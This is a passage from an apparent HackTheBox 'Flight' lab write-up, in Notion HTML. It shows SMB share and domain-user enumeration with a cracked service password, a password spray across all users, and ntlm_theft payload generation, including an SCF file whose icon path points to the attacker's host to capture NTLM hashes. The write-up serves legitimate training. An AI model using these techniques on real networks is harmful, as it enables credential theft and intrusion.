+1g 0:00:00:02 DONE (2024-02-13 21:38) 0.4149g/s 4425Kp/s 4425Kc/s 4425KC/s SANTIBANEZ..Ryanelkins
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/3f8d3d4e9e0d449aa532a89e924ba99c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/01b2941b12664e889d019d0c49e0efe4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SMB Access as </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">svc_apache</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/b2cc0539110b4cabad2eec4004623212" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the password, I can access SMB as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_apache</code></span><span class="SemanticString">, and it has read access to quite a few shares. I’ll focus on those non-standard shares.</span></span></p></div><pre id="https://www.notion.so/68c874a6aa2d48528e431ad5f513df44" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb flight.htb -u &#x27;svc_apache&#x27; -p &#x27;S@Ss!K@*t13&#x27; --shares
+
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         flight.htb      445    G0               [+] Enumerated shares
+SMB         flight.htb      445    G0               Share           Permissions     Remark
+SMB         flight.htb      445    G0               -----           -----------     ------
+SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
+SMB         flight.htb      445    G0               C$                              Default share
+SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
+SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
+SMB         flight.htb      445    G0               Shared          READ            
+SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
+SMB         flight.htb      445    G0               Users           READ            
+SMB         flight.htb      445    G0               Web             READ</span></span></span></code></pre><div id="https://www.notion.so/c4607e4c6585405fba90570970e34900" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Web</code></span><span class="SemanticString"> seems to be the web root for the two sites:</span></span></p></div><pre id="https://www.notion.so/ac319e3434784d70a74ad06e8500532e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -U &#x27;svc_apache%S@Ss!K@*t13&#x27; \\\\flight.htb\\Web 
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+  .                                   D        0  Wed Feb 14 04:42:00 2024
+  ..                                  D        0  Wed Feb 14 04:42:00 2024
+  flight.htb                          D        0  Wed Feb 14 04:42:00 2024
+  school.flight.htb                   D        0  Wed Feb 14 04:42:00 2024
+
+		5056511 blocks of size 4096. 1245619 blocks available</span></span></span></code></pre><div id="https://www.notion.so/bd06c8dd5dfc426f828a7acd49ec6c5c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Only static files are found in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">flight.htb</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/34dc781a41ab46e781c55e382b401b84" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \flight.htb\&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+  .                                   D        0  Wed Feb 14 04:42:00 2024
+  ..                                  D        0  Wed Feb 14 04:42:00 2024
+  css                                 D        0  Wed Feb 14 04:42:00 2024
+  images                              D        0  Wed Feb 14 04:42:00 2024
+  index.html                          A     7069  Thu Feb 24 16:28:10 2022
+  js                                  D        0  Wed Feb 14 04:42:00 2024
+
+		5056511 blocks of size 4096. 1245619 blocks available</span></span></span></code></pre><div id="https://www.notion.so/f1f2913f293046d39e00a8e947ed02d4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">school.flight.htb</code></span><span class="SemanticString"> also contains mostly static content:</span></span></p></div><pre id="https://www.notion.so/0b245c5f436943baa1657bdd4bd0b529" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \school.flight.htb\&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+  .                                   D        0  Wed Feb 14 04:42:00 2024
+  ..                                  D        0  Wed Feb 14 04:42:00 2024
+  about.html                          A     1689  Tue Oct 25 14:24:45 2022
+  blog.html                           A     3618  Tue Oct 25 14:23:59 2022
+  home.html                           A     2683  Tue Oct 25 14:26:58 2022
+  images                              D        0  Wed Feb 14 04:42:00 2024
+  index.php                           A     2092  Thu Oct 27 18:29:25 2022
+  lfi.html                            A      179  Thu Oct 27 18:25:16 2022
+  styles                              D        0  Wed Feb 14 04:42:00 2024
+
+		5056511 blocks of size 4096. 1245619 blocks available</span></span></span></code></pre><div id="https://www.notion.so/aabb82a8092241d5bcda1cabed219a5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly there’s a file called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">lfi.html</code></span><span class="SemanticString">, but it’s just an LFI warning message:</span></span></p></div><div id="https://www.notion.so/25b12a8092bf4052b209ad7861c98b42" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc1802577-a722-48d7-818d-989ab683478d%2FUntitled.png?width=834&amp;table=block&amp;id=25b12a80-92bf-4052-b209-ad7861c98b42"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc1802577-a722-48d7-818d-989ab683478d%2FUntitled.png?width=834&amp;table=block&amp;id=25b12a80-92bf-4052-b209-ad7861c98b42" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/cd64e08952484128a17a473f4d2f18b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Users</code></span><span class="SemanticString"> looks like the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\Users\</code></span><span class="SemanticString"> directory on the box. All the folders for other users are not accessible, and nothing of interest are found in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_apache</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/b9639efc068a4727ace95df3212591ac" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -U &#x27;svc_apache%S@Ss!K@*t13&#x27; \\\\flight.htb\\Users 
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> dir
+  .                                  DR        0  Fri Sep 23 05:46:56 2022
+  ..                                 DR        0  Fri Sep 23 05:46:56 2022
+  .NET v4.5                           D        0  Fri Sep 23 04:58:03 2022
+  .NET v4.5 Classic                   D        0  Fri Sep 23 04:58:02 2022
+  Administrator                       D        0  Tue Nov  1 05:04:00 2022
+  All Users                       DHSrn        0  Sat Sep 15 16:58:48 2018
+  C.Bum                               D        0  Fri Sep 23 05:38:23 2022
+  Default                           DHR        0  Wed Jul 21 04:50:24 2021
+  Default User                    DHSrn        0  Sat Sep 15 16:58:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 16:46:48 2018
+  Public                             DR        0  Wed Jul 21 04:53:25 2021
+  svc_apache                          D        0  Sat Oct 22 05:20:21 2022
+
+		5056511 blocks of size 4096. 1245347 blocks available</span></span></span></code></pre><div id="https://www.notion.so/1bd9dc5a9e7347c2aed76852d0c7d104" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Shared</code></span><span class="SemanticString"> is just an empty share.</span></span></p></div><pre id="https://www.notion.so/c7843a6f6dd24835b37c0e72e07b7ab7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -U &#x27;svc_apache%S@Ss!K@*t13&#x27; \\\\flight.htb\\Shared
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> dir
+  .                                   D        0  Wed Feb 14 05:18:15 2024
+  ..                                  D        0  Wed Feb 14 05:18:15 2024
+
+		5056511 blocks of size 4096. 1243490 blocks available</span></span></span></code></pre><div id="https://www.notion.so/e50a4a7f250741c49ed038675e8f44ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Given there’s no write access, I can’t do much with the shares.</span></span></p></div><div id="https://www.notion.so/0dad39ec0f184ce28cf0916e2b89b0d4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/21a400effd474b2ea55df1121edfb44b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">RPC User Enumeration:</strong></span></span></p></div><div id="https://www.notion.so/090d432669de4452bcd47916cefc7183" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With valid credentials, I can obtain a list of domain users from RPC using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">impacket-lookupsid</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/6cefe53c7454499d8741f0200f8785af" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-lookupsid &#x27;svc_apache:S@Ss!K@*t13@flight.htb&#x27;
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Brute forcing SIDs at flight.htb
+[*] StringBinding ncacn_np:flight.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
+498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: flight\Administrator (SidTypeUser)
+501: flight\Guest (SidTypeUser)
+502: flight\krbtgt (SidTypeUser)
+512: flight\Domain Admins (SidTypeGroup)
+513: flight\Domain Users (SidTypeGroup)
+514: flight\Domain Guests (SidTypeGroup)
+515: flight\Domain Computers (SidTypeGroup)
+516: flight\Domain Controllers (SidTypeGroup)
+517: flight\Cert Publishers (SidTypeAlias)
+518: flight\Schema Admins (SidTypeGroup)
+519: flight\Enterprise Admins (SidTypeGroup)
+520: flight\Group Policy Creator Owners (SidTypeGroup)
+521: flight\Read-only Domain Controllers (SidTypeGroup)
+522: flight\Cloneable Domain Controllers (SidTypeGroup)
+525: flight\Protected Users (SidTypeGroup)
+526: flight\Key Admins (SidTypeGroup)
+527: flight\Enterprise Key Admins (SidTypeGroup)
+553: flight\RAS and IAS Servers (SidTypeAlias)
+571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
+572: flight\Denied RODC Password Replication Group (SidTypeAlias)
+1000: flight\Access-Denied Assistance Users (SidTypeAlias)
+1001: flight\G0$ (SidTypeUser)
+1102: flight\DnsAdmins (SidTypeAlias)
+1103: flight\DnsUpdateProxy (SidTypeGroup)
+1602: flight\S.Moon (SidTypeUser)
+1603: flight\R.Cold (SidTypeUser)
+1604: flight\G.Lors (SidTypeUser)
+1605: flight\L.Kein (SidTypeUser)
+1606: flight\M.Gold (SidTypeUser)
+1607: flight\C.Bum (SidTypeUser)
+1608: flight\W.Walker (SidTypeUser)
+1609: flight\I.Francis (SidTypeUser)
+1610: flight\D.Truff (SidTypeUser)
+1611: flight\V.Stevens (SidTypeUser)
+1612: flight\svc_apache (SidTypeUser)
+1613: flight\O.Possum (SidTypeUser)
+1614: flight\WebDevs (SidTypeGroup)</span></span></span></code></pre><div id="https://www.notion.so/cb36eafbceef4a72bc315a1ffe1c5392" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This can also be done with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">crackmapexec</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/dd205df318ab493bb335c6ac1d56241f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb flight.htb -u &#x27;svc_apache&#x27; -p &#x27;S@Ss!K@*t13&#x27; --users 
+
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         flight.htb      445    G0               [+] Enumerated domain user(s)
+SMB         flight.htb      445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: Helpdesk
+SMB         flight.htb      445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: Service Apache web
+SMB         flight.htb      445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: Secretary
+SMB         flight.htb      445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: Project Manager
+SMB         flight.htb      445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: Nobody knows why he&#x27;s here
+SMB         flight.htb      445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: Payroll officer
+SMB         flight.htb      445    G0               flight.htb\C.Bum                          badpwdcount: 1 desc: Senior Web Developer
+SMB         flight.htb      445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: Sysadmin
+SMB         flight.htb      445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: Penetration tester
+SMB         flight.htb      445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: Sales manager
+SMB         flight.htb      445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: HR Assistant
+SMB         flight.htb      445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: Junion Web Developer
+SMB         flight.htb      445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
+SMB         flight.htb      445    G0               flight.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
+SMB         flight.htb      445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain</span></span></span></code></pre><div id="https://www.notion.so/ef7bb174a52f44279ef6cb828a82003d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It is not uncommon to find passwords being reused for service accounts, especially in poorly-configured AD environments. I’ll put all the usernames into a file, and use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">crackmapexec</code></span><span class="SemanticString"> again to perform a password spray. It finds that the same password is also used for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">S.Moon</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/76432f125b38458a9a3edeb5ca35a23b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb flight.htb -u users.txt -p &#x27;S@Ss!K@*t13&#x27; --continue-on-success
+
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               </span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>[+] flight.htb\svc_apache:S@Ss!K@*t13 </span></mark></span><span class="SemanticString"><span>
+SMB         flight.htb      445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               </span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>[+] flight.htb\S.Moon:S@Ss!K@*t13</span></mark></span><span class="SemanticString"><span> 
+SMB         flight.htb      445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE</span></span></span></code></pre><div id="https://www.notion.so/5066d8ef1fef45e2b5cbe96b40054b9a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/30115269d2114200ade5b76b3a005929" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SMB Access as </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">S.Moon</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/d380e22687e0489faf403f5f0a794bf3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the credentials, I tried logging in to WinRM, but no luck here.</span></span></p></div><pre id="https://www.notion.so/7fa2cab0cb944fec8b66023eb0158058" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u S.Moon -p &#x27;S@Ss!K@*t13&#x27; -i flight.htb
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+Error: Exiting with code 1</span></span></span></code></pre><div id="https://www.notion.so/2c91e90c144f4dfc958c5c39bcdbb6d9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On SMB, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">S.Moon</code></span><span class="SemanticString"> does have extra write access to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Shared</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/868de437c2b04d1e85d2ff45abdb3ab7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb flight.htb -u &#x27;S.Moon&#x27; -p &#x27;S@Ss!K@*t13&#x27; --shares
+
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+SMB         flight.htb      445    G0               [+] Enumerated shares
+SMB         flight.htb      445    G0               Share           Permissions     Remark
+SMB         flight.htb      445    G0               -----           -----------     ------
+SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
+SMB         flight.htb      445    G0               C$                              Default share
+SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
+SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
+SMB         flight.htb      445    G0               Shared          READ,WRITE      
+SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
+SMB         flight.htb      445    G0               Users           READ            
+SMB         flight.htb      445    G0               Web             READ</span></span></span></code></pre><div id="https://www.notion.so/a70514ae5f974cc4a87a1f7b7f5d573a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, it returned “Access Denied” when I tried uploading a text file. There’s probably some limitations on what file types are allowed to be uploaded here.</span></span></p></div><div id="https://www.notion.so/218c0cf5b45047b28a4062451bc6b7a3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/cd6556a3fd1546a0b8e89848d095cab2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">NTLM Forced Authentication — Round 2:</strong></span></span></p></div><div id="https://www.notion.so/d98192aad5b84fe690e447e1761cf4ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Based on the name of the share, I’m guessing there’s other users accessing the share and potentially opening the files in there. There’s a classic attack on SMB which involves dropping an SCF (Shell Command File) file in a share referencing an attacker-controlled host. When a user opens the file, it will connect to the remote share and attempt to authenticate to it. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">This post</a></span><span class="SemanticString"> provides a simple example of such attacks.</span></span></p></div><div id="https://www.notion.so/75bb4f32343642bba7ed815032aae66c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll fire up the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">responder</code></span><span class="SemanticString"> server again, and use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a></span><span class="SemanticString"> to generate a bunch of payloads in different file types. Since there’s filetype filtering, we may need to try multiple payloads.</span></span></p></div><pre id="https://www.notion.so/3359d8a498ed4a059d44b2ef78e966ad" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight/ntlm_theft]
+└─$</span></mark></span><span class="SemanticString"><span> python ntlm_theft.py --generate all --server 10.10.14.35 --filename exploit
+
+Created: exploit/exploit.scf (BROWSE TO FOLDER)
+Created: exploit/exploit-(url).url (BROWSE TO FOLDER)
+Created: exploit/exploit-(icon).url (BROWSE TO FOLDER)
+Created: exploit/exploit.lnk (BROWSE TO FOLDER)
+Created: exploit/exploit.rtf (OPEN)
+Created: exploit/exploit-(stylesheet).xml (OPEN)
+Created: exploit/exploit-(fulldocx).xml (OPEN)
+Created: exploit/exploit.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: exploit/exploit-(includepicture).docx (OPEN)
+Created: exploit/exploit-(remotetemplate).docx (OPEN)
+Created: exploit/exploit-(frameset).docx (OPEN)
+Created: exploit/exploit-(externalcell).xlsx (OPEN)
+Created: exploit/exploit.wax (OPEN)
+Created: exploit/exploit.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: exploit/exploit.asx (OPEN)
+Created: exploit/exploit.jnlp (OPEN)
+Created: exploit/exploit.application (DOWNLOAD AND OPEN)
+Created: exploit/exploit.pdf (OPEN AND ALLOW)
+Created: exploit/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: exploit/Autorun.inf (BROWSE TO FOLDER)
+Created: exploit/desktop.ini (BROWSE TO FOLDER)
+Generation Complete.</span></span></span></code></pre><div id="https://www.notion.so/3cf74ecac8154e618d96dc7e23e9217a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll upload the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.scf</code></span><span class="SemanticString"> file first, since it’s the most well-known one. These files are commonly used for creating custom shortcuts, and the payload below specifies the icon file to be a UNC path pointing to my host. If opened, it will connect to my host, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">responder</code></span><span class="SemanticString"> would be able to capture the NTLM hash.</span></span></p></div><pre id="https://www.notion.so/d3929a6b48ba4ce29ee8e6887ce46d97" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[Shell]
+Command=2
+IconFile=\\10.10.14.35\tools\nc.ico
+[Taskbar]
+Command=ToggleDesktop</span></span></span></code></pre><div id="https://www.notion.so/3e7b1b0ad6cc4b8f9ea7f31bc2f5e9be" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Uploading the file resulted in “Access Denied” again, so this file type may also be blocked.</span></span></p></div><pre id="https://www.notion.so/b119a078bb174e6f90414ab39cce9058" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../flight/ntlm_theft/exploit]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -U &#x27;S.Moon%S@Ss!K@*t13&#x27; \\\\flight.htb\\Shared
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> put exploit.scf
+
+NT_STATUS_ACCESS_DENIED opening remote file \exploit.scf
+
